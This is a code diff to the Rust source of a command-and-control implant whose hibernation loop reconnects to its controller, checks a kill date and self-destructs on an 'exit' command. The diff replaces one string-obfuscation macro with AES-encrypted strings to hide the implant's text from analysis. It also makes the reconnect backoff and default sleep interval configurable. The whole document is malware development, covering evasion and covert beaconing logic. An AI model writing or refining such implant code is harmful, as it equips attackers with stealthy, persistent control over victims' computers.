@@ -40,7 +40,8 @@ use crate::agent::pivot::PivotManager;
 use crate::agent::scripting::ExtensionManager;
 use crate::agent::{compute_auth_hmac, sleep_with_mask};
 use crate::common::{ClientHello, MalleableProfile, SecuredCommand, C2Config};
-use crate::lc;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 use crate::traffic::DataMolder;
 use crate::transport::ClientTransport;
 
@@ -69,6 +70,11 @@ pub async fn run_hibernation(
     let mut connect_failures: u32 = 0;
     let mut last_counter: u64 = 0;
 
+    // Reconnect backoff cap from the typed agent config (default 300 s).
+    // Fetched once; the process-wide config is immutable after first access.
+    // (Fully-qualified: the local `config: C2Config` shadows the accessor.)
+    let backoff_cap_secs = crate::config::config().agent.backoff_cap_secs;
+
     loop {
         // ── Kill-date ─────────────────────────────────────────────────────
         if let Some(kill_ts) = config.kill_date {
@@ -86,8 +92,8 @@ pub async fn run_hibernation(
             }
             Err(e) => {
                 warn!("Hibernation connect failed: {}", e);
-                // Exponential backoff capped at 5 minutes
-                let base = std::cmp::min(5u64 * 2u64.saturating_pow(connect_failures), 300);
+                // Exponential backoff capped at agent.backoff_cap_secs (5 min default)
+                let base = std::cmp::min(5u64 * 2u64.saturating_pow(connect_failures), backoff_cap_secs);
                 let jitter = rand::thread_rng().gen_range(0..=(base / 2).max(1));
                 connect_failures = connect_failures.saturating_add(1);
                 tokio::time::sleep(std::time::Duration::from_secs(base + jitter)).await;
@@ -127,7 +133,7 @@ pub async fn run_hibernation(
 
         let hello = ClientHello {
             hostname: hostname::get()
-                .unwrap_or(lc!("unknown").into())
+                .unwrap_or(aes_str!("unknown").into())
                 .to_string_lossy()
                 .into(),
             os: std::env::consts::OS.to_string(),
@@ -273,7 +279,7 @@ pub async fn run_hibernation(
 
             last_counter = msg.counter;
 
-            if msg.command == lc!("exit") {
+            if msg.command == aes_str!("exit") {
                 crate::utils::self_destruct();
             }
 
@@ -312,7 +318,9 @@ async fn sleep_cycle(config: &mut C2Config) {
     let base_ms = if config.sleep_interval > 0 {
         config.sleep_interval * 1000
     } else {
-        60_000 // sensible default for hibernation if not explicitly set
+        // Hibernation fallback when no interval is set; reads the typed
+        // config (default 60 s, matching the previous hardcoded value).
+        crate::config::config().agent.default_sleep_secs * 1000
     };
 
     let safe_min = config.jitter_min;
